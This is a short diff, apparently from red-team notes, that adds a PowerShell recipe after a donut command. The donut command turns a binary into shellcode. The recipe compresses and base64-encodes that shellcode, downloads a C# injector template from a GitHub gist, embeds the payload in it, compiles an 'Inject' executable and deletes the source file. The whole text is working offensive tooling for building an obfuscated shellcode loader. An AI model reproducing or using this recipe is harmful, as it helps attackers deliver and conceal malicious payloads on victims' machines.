@@ -1,1 +1,16 @@
 ./donut -i LegitBinary.exe -b1 -t -p '-a PARAM1 -b PARAM2 ...' -o LegitBinary.bin
+
+
+$binaryName = "LegitBinary"
+$bytes = [System.IO.File]::ReadAllBytes("$(pwd)\${binaryName}.bin")
+[System.IO.MemoryStream] $outStream = New-Object System.IO.MemoryStream
+$dStream = New-Object System.IO.Compression.DeflateStream($outStream, [System.IO.Compression.CompressionLevel]::Optimal)
+$dStream.Write($bytes, 0, $bytes.Length)
+$dStream.Dispose()
+$outBytes = $outStream.ToArray()
+$outStream.Dispose()
+$b64Compressed = [System.Convert]::ToBase64String($outBytes)
+$template = (New-Object Net.WebClient).DownloadString("https://gist.github.com/snovvcrash/30bd25b1a5a18d8bb7ce3bb8dc2bae37/raw/c8beeb9e36ee8188cc6a243d13b4dd9620ffa03b/template.cs") -creplace 'DONUT', $b64Compressed
+$template -creplace 'NAMESPACE', "${binaryName}Inject" > ${binaryName}Inject.cs
+csc /t:exe /platform:x64 /out:${binaryName}Inject.exe ${binaryName}Inject.cs
+rm ${binaryName}Inject.cs
